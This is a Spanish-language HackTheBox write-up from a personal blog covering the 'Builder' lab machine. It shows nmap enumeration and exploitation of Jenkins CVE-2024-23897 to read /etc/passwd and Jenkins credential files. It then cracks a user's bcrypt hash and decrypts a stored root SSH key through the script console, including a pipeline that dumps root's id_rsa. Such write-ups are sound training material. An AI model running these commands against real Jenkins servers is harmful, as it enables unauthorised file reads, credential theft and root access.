<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  Builder Machine - HackTheBox · Celero0 Blog
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="CeleroRKX">
<meta name="description" content="

Tags: #Linux



  Enumeración Nmap
  
    
    Link to heading
  

Comando:
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts

Vemos información importante, como la versión de Jetty 10.0.18, y que se utiliza Jenkins

  Enumeración puerto HTTP 8080
  
    
    Link to heading
  

Utilizando la herramienta whatweb sobre el puerto 8080 nos encontramos con la versión de Jenkins 2.441">
<meta name="keywords" content="blog,developer,personal">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Builder Machine - HackTheBox">
  <meta name="twitter:description" content="Tags: #Linux Enumeración Nmap Link to heading Comando:
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts Vemos información importante, como la versión de Jetty 10.0.18, y que se utiliza Jenkins
Enumeración puerto HTTP 8080 Link to heading Utilizando la herramienta whatweb sobre el puerto 8080 nos encontramos con la versión de Jenkins 2.441">

<meta property="og:url" content="https://celero0.github.io/posts/builder/">
  <meta property="og:site_name" content="Celero0 Blog">
  <meta property="og:title" content="Builder Machine - HackTheBox">
  <meta property="og:description" content="Tags: #Linux Enumeración Nmap Link to heading Comando:
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts Vemos información importante, como la versión de Jetty 10.0.18, y que se utiliza Jenkins
Enumeración puerto HTTP 8080 Link to heading Utilizando la herramienta whatweb sobre el puerto 8080 nos encontramos con la versión de Jenkins 2.441">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-12-20T20:19:28+00:00">
    <meta property="article:modified_time" content="2025-12-20T20:19:28+00:00">




<link rel="canonical" href="https://celero0.github.io/posts/builder/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  



 




<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://celero0.github.io/">
      Celero0 Blog
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">Writeups</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://celero0.github.io/posts/builder/">
              Builder Machine - HackTheBox
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2025-12-20T20:19:28Z">
                December 20, 2025
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              4-minute read
            </span>
          </div>
          
          
          
        </div>
      </header>

      <div class="post-content">
        
        <hr>
<ul>
<li>Tags: #Linux</li>
</ul>
<hr>
<h1 id="enumeración-nmap">
  Enumeración Nmap
  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p><strong>Comando:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.74 -oG allPorts
</span></span></code></pre></div><img src="/images/Pasted image 20250926155642.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>Vemos información importante, como la versión de Jetty 10.0.18, y que se utiliza Jenkins</p>
<h1 id="enumeración-puerto-http-8080">
  Enumeración puerto HTTP 8080
  <a class="heading-link" href="#enumeraci%c3%b3n-puerto-http-8080">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Utilizando la herramienta whatweb sobre el puerto 8080 nos encontramos con la versión de Jenkins 2.441</p>
<img src="/images/Pasted image 20250926160057.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>Viendo la página web nos muestra el dashboard de Jenkins</p>
<p><img src="/images/Pasted image 20250926164333.png" style="width:100%; height:auto; display:block; margin:auto;">También nos muestra que hay un apartado de &ldquo;Credentials&rdquo;, donde nos muestra está creado un SSH RSA para el usuario root</p>
<img src="/images/Pasted image 20250926164709.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>Además nos muestra un usuario válido &ldquo;jennifer&rdquo;</p>
<img src="/images/Pasted image 20250926164747.png" style="width:100%; height:auto; display:block; margin:auto;">
<h1 id="explotación-lfi-cve-2024-23897">
  Explotación LFI CVE-2024-23897
  <a class="heading-link" href="#explotaci%c3%b3n-lfi-cve-2024-23897">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Si buscamos por la versión de Jenkins encontramos un LFI</p>
<p><img src="/images/Pasted image 20250926165017.png" style="width:100%; height:auto; display:block; margin:auto;">Hay un script que permite realizar la vulnerabilidad, pero también hay una forma manual de utilizarla:</p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.md"  class="external-link" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.md</a></p>
<p>Para hacerlo primero debemos command-line client &ldquo;jeknkins-cli.jar&rdquo;</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar
</span></span></code></pre></div><p>ó</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
</span></span></code></pre></div><p>Ahora podemos leer los archivos con el siguiente comando</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/etc/passwd&#34;</span>
</span></span></code></pre></div><h2 id="archivos-de-usuario">
  Archivos de usuario
  <a class="heading-link" href="#archivos-de-usuario">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Como conseguimos realizar un LFI ahora podemos leer archivos críticos de jenkins
el archivo <code>/var/jenkins_home/users/users.xml</code> contiene nombres de usuarios de jenkins con el nombre de su directorio, en este caso <code>jennifer_12108429903186576833</code>
<strong>Comando:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/var/jenkins_home/users/users.xml&#34;</span>
</span></span></code></pre></div><img src="/images/Pasted image 20250926173246.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>Sabiendo el nombre del directorio podemos ver su archivo de configuración en</p>
<p><code>/var/jenkins_home/users/&lt;nombre_usuario&gt;_.../config.xml</code></p>
<p><strong>Comando:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml&#34;</span>
</span></span></code></pre></div><p>Donde encontramos el hash de la contraseña de jennifer</p>
<img src="/images/Pasted image 20250926173553.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>Que es <code>jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</code>
Lo guardaremos en hash.txt, y utilizamos john para desencriptarla
<strong>Comando:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#ff7b72;font-weight:bold">=</span>bcrypt --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt hash.txt
</span></span></code></pre></div><img src="/images/Pasted image 20250926173752.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>Con las credenciales: <code>jennifer:princess</code> nos conectaremos al login de Jenkins</p>
<img src="/images/Pasted image 20250926173917.png" style="width:100%; height:auto; display:block; margin:auto;">
<h1 id="obtención-consola-root">
  Obtención consola root
  <a class="heading-link" href="#obtenci%c3%b3n-consola-root">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<h2 id="método-1">
  Método 1:
  <a class="heading-link" href="#m%c3%a9todo-1">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>El fichero /var/jenkins_home/credentials.xml  almacena todas las credenciales que Jenkins utiliza para interactuar con otros servicios (claves SSH, contraseñas de bases de datos, tokens de API, etc. Las contraseñas están cifradas pero desde la página web http://10.10.11.10:8080/script se puede desencriptar la rsa key</p>
<p>Haremos el siguiente comando para obtener la PrivateKey encripatada
<strong>Comando:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node <span style="color:#a5d6ff">&#34;@/var/jenkins_home/credentials.xml&#34;</span>
</span></span></code></pre></div><img src="/images/Pasted image 20250926174737.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>Al final aparece el usuario dueño dela private key, en este caso root</p>
<img src="/images/Pasted image 20250926182636.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>Copiamos solo lo que está dentro de <code>&lt;privateKey&gt;</code> y lo guardamos en un archivo llamado rsa.txt</p>
<img src="/images/rsajenkins.PNG" style="width:100%; height:auto; display:block; margin:auto;">
<p>y para eliminar los espacios de la rsa.txt haremos el siguiente comando
<strong>Comando:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat rsa.txt | tr -d <span style="color:#a5d6ff">&#39;\n&#39;</span> &gt; rsa.key
</span></span></code></pre></div><p>Ahora vamos a <code>http://10.10.11.10:8080/script</code> en la consola debemos pegar la siguiente línea: <code>println(hudson.util.Secret.fromString(&quot;{XXX=}&quot;).getPlainText())</code> donde las XXX son el texto copiado en rsa.key</p>
<pre tabindex="0"><code>println(hudson.util.Secret.fromString(&#34;{XXX=}&#34;).getPlainText())
</code></pre><p>Al correrlo obtendremos la RSA de root</p>
<img src="/images/Pasted image 20250926182319.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>copiamos la RSA y creamos id_rsa en nuestra máquina local, y le damos permiso 600</p>
<img src="/images/Pasted image 20250926182410.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>y luegos nos conectamos con el siguiente comando
<strong>Comando:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh root@10.10.11.10 -i id_rsa
</span></span></code></pre></div><img src="/images/Pasted image 20250926182448.png" style="width:100%; height:auto; display:block; margin:auto;">
<h2 id="método-2">
  Método 2:
  <a class="heading-link" href="#m%c3%a9todo-2">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Como encontramos http://10.10.11.10:8080/credentials anteriormente en [[#Enumeración puerto HTTP 8080]], vamos a ese recurso ahora que estámos logueados
damos click a los iconos y llegamos a http://10.10.11.10:8080/manage/credentials/store/system/domain/_/
Le damos a la llave que aparece a la derecha</p>
<img src="/images/Pasted image 20250926183552.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>y en inspeccionar vemos &ldquo;Concealed for Confidentiality&rdquo;</p>
<img src="/images/Pasted image 20250926183631.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>Copiamos el value que aparece ahí</p>
<img src="/images/Pasted image 20250926183653.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>creamos un rsa.txt en nuestra máquina local</p>
<img src="/images/Pasted image 20250926183818.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>vamos a http://10.10.11.10/script y pegamos el siguiente código</p>
<pre tabindex="0"><code>println(hudson.util.Secret.decrypt(&#34;{XXX=}&#34;))
</code></pre><p>y obtenemos el id_rsa</p>
<img src="/images/Pasted image 20250926183959.png" style="width:100%; height:auto; display:block; margin:auto;">
<h2 id="método-3">
  Método 3:
  <a class="heading-link" href="#m%c3%a9todo-3">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Primeto vemos la siguiente ruta http://10.10.11.10:8080/manage/pluginManager/installed en busca de los plugins de SSH instalados</p>
<img src="/images/Pasted image 20250926184438.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>Ahora en el dashboard le damos a &ldquo;Create a job&rdquo;</p>
<p><img src="/images/Pasted image 20250926184517.png" style="width:100%; height:auto; display:block; margin:auto;">Creamos una Pipeline con cualquier nombre</p>
<p><img src="/images/Pasted image 20250926184544.png" style="width:100%; height:auto; display:block; margin:auto;">Bajamos hacia Pipeline script y pegamos el siguiente código, recordando cambiar la ip y usuario según corresponda</p>
<pre tabindex="0"><code>pipeline {
    agent any
    stages {
        stage(&#39;SSH&#39;) {
            steps {
                script {
                    sshagent(credentials: [&#39;1&#39;]) {
                        sh &#39;ssh -o StrictHostKeyChecking=no root@10.10.11.10 &#34;cat /root/.ssh/id_rsa&#34;&#39;
                    }
                }
            }
        }
    }
}
</code></pre><p>Le damos a sabe y luego a build Now</p>
<img src="/images/Pasted image 20250926184837.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>En build history le damos click</p>
<img src="/images/Pasted image 20250926184900.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>y luego le damos a Console Output</p>
<img src="/images/Pasted image 20250926184918.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>y nos da el id_rsa de output</p>
<img src="/images/Pasted image 20250926184937.png" style="width:100%; height:auto; display:block; margin:auto;">
<h1 id="pwneo-de-la-máquina">
  Pwneo de la máquina
  <a class="heading-link" href="#pwneo-de-la-m%c3%a1quina">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h1>
<p>Nos conectamos como lo hicimos anteriormente  con el id_rsa
y obtenemos la flag de usuario</p>
<img src="/images/Pasted image 20250926185141.png" style="width:100%; height:auto; display:block; margin:auto;">
<p>y la flag de root</p>
<img src="/images/Pasted image 20250926185200.png" style="width:100%; height:auto; display:block; margin:auto;">
y pwneamos la máquina

      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2019 -
    
    2025
     CeleroRKX 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
